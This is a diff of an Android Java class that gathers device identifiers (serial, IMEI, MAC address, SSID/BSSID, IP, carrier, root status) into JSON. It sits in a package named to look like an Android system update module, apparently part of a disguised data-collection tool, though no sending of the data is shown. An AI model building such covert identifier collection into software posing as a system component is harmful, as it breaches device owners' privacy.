@@ -2,8 +2,10 @@ package com.android.system.update.modules;
 
 import android.app.ActivityManager;
 import android.content.Context;
+import android.content.pm.PackageManager;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
+import android.net.wifi.WifiInfo;
 import android.net.wifi.WifiManager;
 import android.os.Build;
 import android.os.Environment;
@@ -13,8 +15,10 @@ import android.telephony.TelephonyManager;
 import android.text.format.Formatter;
 import android.util.DisplayMetrics;
 import android.view.WindowManager;
+import android.util.Log;
 
 import org.json.JSONObject;
+import org.json.JSONException;
 
 import java.io.BufferedReader;
 import java.io.File;
@@ -25,6 +29,7 @@ import java.util.List;
 import java.util.Locale;
 
 public class DeviceModule {
+    private static final String TAG = "DeviceModule";
     private Context context;
     
     public DeviceModule(Context context) {
@@ -32,9 +37,9 @@ public class DeviceModule {
     }
     
     public String getDeviceInfo() {
+        JSONObject info = new JSONObject();
+        
         try {
-            JSONObject info = new JSONObject();
-            
             // 1. Device Identification
             collectDeviceIdentification(info);
             
@@ -62,32 +67,35 @@ public class DeviceModule {
             // 9. Performance Metrics
             collectPerformanceMetrics(info);
             
-            return info.toString(4); // Pretty print with 4 spaces
+            return info.toString(4);
             
         } catch (Exception e) {
-            e.printStackTrace();
-            return "{\"error\":\"" + e.getMessage() + "\"}";
+            Log.e(TAG, "Error getting device info", e);
+            try {
+                return new JSONObject().put("error", e.getMessage()).toString();
+            } catch (JSONException je) {
+                return "{\"error\":\"" + e.getMessage() + "\"}";
+            }
         }
     }
     
-    private void collectDeviceIdentification(JSONObject info) throws Exception {
-        info.put("manufacturer", Build.MANUFACTURER);
-        info.put("model", Build.MODEL);
-        info.put("brand", Build.BRAND);
-        info.put("product", Build.PRODUCT);
-        info.put("device", Build.DEVICE);
-        info.put("hardware", Build.HARDWARE);
-        info.put("serial", Build.SERIAL);
-        info.put("bootloader", Build.BOOTLOADER);
+    private void collectDeviceIdentification(JSONObject info) throws JSONException {
+        info.put("manufacturer", safeGet(() -> Build.MANUFACTURER, "Unknown"));
+        info.put("model", safeGet(() -> Build.MODEL, "Unknown"));
+        info.put("brand", safeGet(() -> Build.BRAND, "Unknown"));
+        info.put("product", safeGet(() -> Build.PRODUCT, "Unknown"));
+        info.put("device", safeGet(() -> Build.DEVICE, "Unknown"));
+        info.put("hardware", safeGet(() -> Build.HARDWARE, "Unknown"));
+        info.put("serial", safeGet(() -> Build.SERIAL, "Unknown"));
+        info.put("bootloader", safeGet(() -> Build.BOOTLOADER, "Unknown"));
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            info.put("radio_version", Build.getRadioVersion());
+            info.put("radio_version", safeGet(() -> Build.getRadioVersion(), "Unknown"));
         }
     }
     
-    private void collectHardwareInfo(JSONObject info) throws Exception {
-        // CPU information
-        info.put("cpu_abi", Build.CPU_ABI);
-        info.put("cpu_abi2", Build.CPU_ABI2);
+    private void collectHardwareInfo(JSONObject info) throws JSONException {
+        info.put("cpu_abi", safeGet(() -> Build.CPU_ABI, "Unknown"));
+        info.put("cpu_abi2", safeGet(() -> Build.CPU_ABI2, "Unknown"));
         info.put("cpu_cores", Runtime.getRuntime().availableProcessors());
         
         // Get CPU info from /proc/cpuinfo
@@ -96,7 +104,7 @@ public class DeviceModule {
             BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
             String line;
             while ((line = reader.readLine()) != null) {
-                if (line.toLowerCase().contains("processor")) {
+                if (line.toLowerCase().contains("processor") || line.toLowerCase().contains("model name")) {
                     String[] parts = line.split(":");
                     if (parts.length > 1) {
                         info.put("processor_info", parts[1].trim());
@@ -110,151 +118,179 @@ public class DeviceModule {
         }
     }
     
-    private void collectOSInfo(JSONObject info) throws Exception {
-        info.put("os_version", Build.VERSION.RELEASE);
+    private void collectOSInfo(JSONObject info) throws JSONException {
+        info.put("os_version", safeGet(() -> Build.VERSION.RELEASE, "Unknown"));
         info.put("sdk_int", Build.VERSION.SDK_INT);
-        info.put("build_id", Build.DISPLAY);
-        info.put("fingerprint", Build.FINGERPRINT);
+        info.put("build_id", safeGet(() -> Build.DISPLAY, "Unknown"));
+        info.put("fingerprint", safeGet(() -> Build.FINGERPRINT, "Unknown"));
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            info.put("security_patch", Build.VERSION.SECURITY_PATCH);
+            info.put("security_patch", safeGet(() -> Build.VERSION.SECURITY_PATCH, "Unknown"));
         }
-        info.put("kernel_version", System.getProperty("os.version"));
+        info.put("kernel_version", safeGet(() -> System.getProperty("os.version"), "Unknown"));
     }
     
-    private void collectMemoryAndStorage(JSONObject info) throws Exception {
+    private void collectMemoryAndStorage(JSONObject info) throws JSONException {
         // RAM information
-        ActivityManager activityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
-        if (activityManager != null) {
-            ActivityManager.MemoryInfo memInfo = new ActivityManager.MemoryInfo();
-            activityManager.getMemoryInfo(memInfo);
-            info.put("total_ram", formatBytes(memInfo.totalMem));
-            info.put("available_ram", formatBytes(memInfo.availMem));
-            info.put("low_memory", memInfo.lowMemory);
-            info.put("ram_threshold", formatBytes(memInfo.threshold));
+        try {
+            ActivityManager activityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
+            if (activityManager != null) {
+                ActivityManager.MemoryInfo memInfo = new ActivityManager.MemoryInfo();
+                activityManager.getMemoryInfo(memInfo);
+                info.put("total_ram", formatBytes(memInfo.totalMem));
+                info.put("available_ram", formatBytes(memInfo.availMem));
+                info.put("low_memory", memInfo.lowMemory);
+                info.put("ram_threshold", formatBytes(memInfo.threshold));
+            }
+        } catch (Exception e) {
+            Log.w(TAG, "Could not get RAM info", e);
         }
         
         // Internal storage
-        StatFs internalStatFs = new StatFs(Environment.getDataDirectory().getPath());
-        info.put("internal_total", formatBytes(internalStatFs.getTotalBytes()));
-        info.put("internal_free", formatBytes(internalStatFs.getAvailableBytes()));
-        info.put("internal_used", formatBytes(internalStatFs.getTotalBytes() - internalStatFs.getAvailableBytes()));
+        try {
+            StatFs internalStatFs = new StatFs(Environment.getDataDirectory().getPath());
+            info.put("internal_total", formatBytes(internalStatFs.getTotalBytes()));
+            info.put("internal_free", formatBytes(internalStatFs.getAvailableBytes()));
+            info.put("internal_used", formatBytes(internalStatFs.getTotalBytes() - internalStatFs.getAvailableBytes()));
+        } catch (Exception e) {
+            Log.w(TAG, "Could not get internal storage info", e);
+        }
         
         // External storage (if available)
-        if (Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED)) {
-            StatFs externalStatFs = new StatFs(Environment.getExternalStorageDirectory().getPath());
-            info.put("external_total", formatBytes(externalStatFs.getTotalBytes()));
-            info.put("external_free", formatBytes(externalStatFs.getAvailableBytes()));
-            info.put("external_used", formatBytes(externalStatFs.getTotalBytes() - externalStatFs.getAvailableBytes()));
-        } else {
-            info.put("external_storage", "Not available");
+        try {
+            if (Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED)) {
+                StatFs externalStatFs = new StatFs(Environment.getExternalStorageDirectory().getPath());
+                info.put("external_total", formatBytes(externalStatFs.getTotalBytes()));
+                info.put("external_free", formatBytes(externalStatFs.getAvailableBytes()));
+                info.put("external_used", formatBytes(externalStatFs.getTotalBytes() - externalStatFs.getAvailableBytes()));
+            } else {
+                info.put("external_storage", "Not available");
+            }
+        } catch (Exception e) {
+            info.put("external_storage", "Error: " + e.getMessage());
         }
     }
     
-    private void collectNetworkInfo(JSONObject info) throws Exception {
+    private void collectNetworkInfo(JSONObject info) throws JSONException {
         JSONObject networkInfo = new JSONObject();
+        JSONObject wifiInfo = new JSONObject();
+        JSONObject mobileInfo = new JSONObject();
         
         // Mobile network info
-        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
-        if (tm != null) {
-            networkInfo.put("carrier", tm.getNetworkOperatorName());
-            networkInfo.put("sim_country", tm.getSimCountryIso());
-            networkInfo.put("network_type", getNetworkType(tm.getNetworkType()));
-            networkInfo.put("phone_type", getPhoneType(tm.getPhoneType()));
-            
-            // IMEI/Device ID - handle permissions properly
-            if (checkPermission(android.Manifest.permission.READ_PHONE_STATE)) {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                    networkInfo.put("device_id", "Restricted (Android 10+)");
+        try {
+            TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
+            if (tm != null) {
+                mobileInfo.put("carrier", safeGet(() -> tm.getNetworkOperatorName(), "Unknown"));
+                mobileInfo.put("sim_country", safeGet(() -> tm.getSimCountryIso(), "Unknown"));
+                mobileInfo.put("network_type", getNetworkType(tm.getNetworkType()));
+                mobileInfo.put("phone_type", getPhoneType(tm.getPhoneType()));
+                
+                // IMEI/Device ID - handle permissions properly
+                if (checkPermission(android.Manifest.permission.READ_PHONE_STATE)) {
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                        mobileInfo.put("device_id", "Restricted (Android 10+)");
+                    } else {
+                        String deviceId = tm.getDeviceId();
+                        mobileInfo.put("device_id", deviceId != null ? deviceId : "Unknown");
+                    }
                 } else {
-                    String deviceId = tm.getDeviceId();
-                    networkInfo.put("device_id", deviceId != null ? deviceId : "Unknown");
+                    mobileInfo.put("device_id", "Permission required");
                 }
-            } else {
-                networkInfo.put("device_id", "Permission required");
             }
+        } catch (Exception e) {
+            Log.w(TAG, "Could not get mobile network info", e);
+            mobileInfo.put("error", e.getMessage());
         }
         
-        // WiFi info
-        WifiManager wm = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
-        if (wm != null && wm.isWifiEnabled()) {
-            networkInfo.put("wifi_mac", getWifiMacAddress());
-            networkInfo.put("ip_address", Formatter.formatIpAddress(wm.getConnectionInfo().getIpAddress()));
-            String ssid = wm.getConnectionInfo().getSSID();
-            networkInfo.put("ssid", ssid != null ? ssid.replace("\"", "") : "Unknown");
-            networkInfo.put("bssid", wm.getConnectionInfo().getBSSID());
-            networkInfo.put("link_speed", wm.getConnectionInfo().getLinkSpeed() + " Mbps");
-            networkInfo.put("rssi", wm.getConnectionInfo().getRssi() + " dBm");
+        // WiFi info - with permission check
+        try {
+            if (checkPermission(android.Manifest.permission.ACCESS_WIFI_STATE)) {
+                WifiManager wm = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
+                if (wm != null && wm.isWifiEnabled()) {
+                    wifiInfo.put("wifi_mac", getWifiMacAddress());
+                    wifiInfo.put("ip_address", Formatter.formatIpAddress(wm.getConnectionInfo().getIpAddress()));
+                    String ssid = wm.getConnectionInfo().getSSID();
+                    wifiInfo.put("ssid", ssid != null ? ssid.replace("\"", "") : "Unknown");
+                    wifiInfo.put("bssid", safeGet(() -> wm.getConnectionInfo().getBSSID(), "Unknown"));
+                    wifiInfo.put("link_speed", wm.getConnectionInfo().getLinkSpeed() + " Mbps");
+                    wifiInfo.put("rssi", wm.getConnectionInfo().getRssi() + " dBm");
+                } else {
+                    wifiInfo.put("status", "WiFi disabled");
+                }
+            } else {
+                wifiInfo.put("status", "Permission denied");
+                wifiInfo.put("message", "ACCESS_WIFI_STATE permission required");
+            }
+        } catch (Exception e) {
+            Log.w(TAG, "Could not get WiFi info", e);
+            wifiInfo.put("error", e.getMessage());
         }
         
         // Network connectivity
-        ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
-        if (cm != null) {
-            NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
-            if (activeNetwork != null) {
-                networkInfo.put("network_connected", activeNetwork.isConnected());
-                networkInfo.put("network_type_name", activeNetwork.getTypeName());
-                networkInfo.put("network_subtype_name", activeNetwork.getSubtypeName());
-                networkInfo.put("network_roaming", activeNetwork.isRoaming());
+        try {
+            ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
+            if (cm != null) {
+                NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
+                if (activeNetwork != null) {
+                    networkInfo.put("network_connected", activeNetwork.isConnected());
+                    networkInfo.put("network_type_name", activeNetwork.getTypeName());
+                    networkInfo.put("network_subtype_name", activeNetwork.getSubtypeName());
+                    networkInfo.put("network_roaming", activeNetwork.isRoaming());
+                }
             }
+        } catch (Exception e) {
+            Log.w(TAG, "Could not get connectivity info", e);
         }
         
+        networkInfo.put("wifi", wifiInfo);
+        networkInfo.put("mobile", mobileInfo);
         info.put("network", networkInfo);
     }
     
-    private void collectDisplayInfo(JSONObject info) throws Exception {
-        WindowManager wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
-        if (wm != null) {
-            DisplayMetrics metrics = new DisplayMetrics();
-            wm.getDefaultDisplay().getMetrics(metrics);
-            
-            JSONObject displayInfo = new JSONObject();
-            displayInfo.put("width", metrics.widthPixels);
-            displayInfo.put("height", metrics.heightPixels);
-            displayInfo.put("density", metrics.density);
-            displayInfo.put("density_dpi", metrics.densityDpi);
-            displayInfo.put("scaled_density", metrics.scaledDensity);
-            displayInfo.put("xdpi", metrics.xdpi);
-            displayInfo.put("ydpi", metrics.ydpi);
-            displayInfo.put("refresh_rate", wm.getDefaultDisplay().getRefreshRate());
-            
-            info.put("display", displayInfo);
+    private void collectDisplayInfo(JSONObject info) throws JSONException {
+        try {
+            WindowManager wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
+            if (wm != null) {
+                DisplayMetrics metrics = new DisplayMetrics();
+                wm.getDefaultDisplay().getMetrics(metrics);
+                
+                JSONObject displayInfo = new JSONObject();
+                displayInfo.put("width", metrics.widthPixels);
+                displayInfo.put("height", metrics.heightPixels);
+                displayInfo.put("density", metrics.density);
+                displayInfo.put("density_dpi", metrics.densityDpi);
+                displayInfo.put("scaled_density", metrics.scaledDensity);
+                displayInfo.put("xdpi", metrics.xdpi);
+                displayInfo.put("ydpi", metrics.ydpi);
+                displayInfo.put("refresh_rate", wm.getDefaultDisplay().getRefreshRate());
+                
+                info.put("display", displayInfo);
+            }
+        } catch (Exception e) {
+            Log.w(TAG, "Could not get display info", e);
         }
     }
     
-    private void collectSecurityInfo(JSONObject info) throws Exception {
+    private void collectSecurityInfo(JSONObject info) throws JSONException {
         JSONObject securityInfo = new JSONObject();
         securityInfo.put("rooted", checkRoot());
         securityInfo.put("debuggable", (Build.FINGERPRINT.startsWith("generic") ||
                 Build.FINGERPRINT.contains("test-keys") ||
-                Build.TAGS != null && Build.TAGS.contains("test-keys")));
-        
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
-            securityInfo.put("verified_boot_state", Build.VERSION.SECURITY_PATCH);
-        }
-        
-        // Check if device is in secure mode
-        try {
-            android.provider.Settings.Secure.getInt(context.getContentResolver(),
-                    android.provider.Settings.Secure.INSTALL_NON_MARKET_APPS);
-            securityInfo.put("unknown_sources", true);
-        } catch (android.provider.Settings.SettingNotFoundException e) {
-            securityInfo.put("unknown_sources", false);
-        }
+                (Build.TAGS != null && Build.TAGS.contains("test-keys"))));
         
         info.put("security", securityInfo);
     }
     
-    private void collectLocalizationInfo(JSONObject info) throws Exception {
+    private void collectLocalizationInfo(JSONObject info) throws JSONException {
         JSONObject localizationInfo = new JSONObject();
-        localizationInfo.put("country", Locale.getDefault().getCountry());
-        localizationInfo.put("language", Locale.getDefault().getLanguage());
-        localizationInfo.put("display_language", Locale.getDefault().getDisplayLanguage());
-        localizationInfo.put("timezone", java.util.TimeZone.getDefault().getID());
+        localizationInfo.put("country", safeGet(() -> Locale.getDefault().getCountry(), "Unknown"));
+        localizationInfo.put("language", safeGet(() -> Locale.getDefault().getLanguage(), "Unknown"));
+        localizationInfo.put("display_language", safeGet(() -> Locale.getDefault().getDisplayLanguage(), "Unknown"));
+        localizationInfo.put("timezone", safeGet(() -> java.util.TimeZone.getDefault().getID(), "Unknown"));
         
         info.put("localization", localizationInfo);
     }
     
-    private void collectPerformanceMetrics(JSONObject info) throws Exception {
+    private void collectPerformanceMetrics(JSONObject info) throws JSONException {
         JSONObject performanceInfo = new JSONObject();
         performanceInfo.put("uptime", SystemClock.elapsedRealtime());
         performanceInfo.put("boot_time", System.currentTimeMillis() - SystemClock.elapsedRealtime());
@@ -264,7 +300,7 @@ public class DeviceModule {
     
     private String getWifiMacAddress() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            return "02:00:00:00:00:00"; // Random MAC on Android 10+
+            return "Randomized (Android 10+)";
         }
         
         try {
@@ -274,7 +310,7 @@ public class DeviceModule {
                     continue;
                 byte[] macBytes = nif.getHardwareAddress();
                 if (macBytes == null)
-                    return "02:00:00:00:00:00";
+                    return "Unavailable";
                 
                 StringBuilder sb = new StringBuilder();
                 for (byte b : macBytes) {
@@ -284,9 +320,10 @@ public class DeviceModule {
                     sb.deleteCharAt(sb.length() - 1);
                 return sb.toString();
             }
-        } catch (Exception ignored) {
+        } catch (Exception e) {
+            Log.w(TAG, "Error getting MAC address", e);
         }
-        return "02:00:00:00:00:00";
+        return "Unknown";
     }
     
     private String getNetworkType(int type) {
@@ -341,10 +378,7 @@ public class DeviceModule {
                 "/data/local/bin/su",
                 "/system/sd/xbin/su",
                 "/system/bin/failsafe/su",
-                "/data/local/su",
-                "/system/bin/.ext/su",
-                "/system/usr/we-need-root/su",
-                "/system/xbin/mu"
+                "/data/local/su"
         };
         
         // Check if test-keys exist
@@ -353,7 +387,7 @@ public class DeviceModule {
             return true;
         }
         
-        // Check for Superuser.apk or su binary
+        // Check for su binary
         for (String path : paths) {
             if (new File(path).exists()) {
                 return true;
@@ -378,6 +412,20 @@ public class DeviceModule {
     }
     
     private boolean checkPermission(String permission) {
-        return context.checkCallingOrSelfPermission(permission) == android.content.pm.PackageManager.PERMISSION_GRANTED;
+        return context.checkCallingOrSelfPermission(permission) == PackageManager.PERMISSION_GRANTED;
+    }
+    
+    // Helper to safely get values without crashing
+    private interface SafeGet<T> {
+        T get();
+    }
+    
+    private <T> T safeGet(SafeGet<T> getter, T defaultValue) {
+        try {
+            T result = getter.get();
+            return result != null ? result : defaultValue;
+        } catch (Exception e) {
+            return defaultValue;
+        }
     }
 }
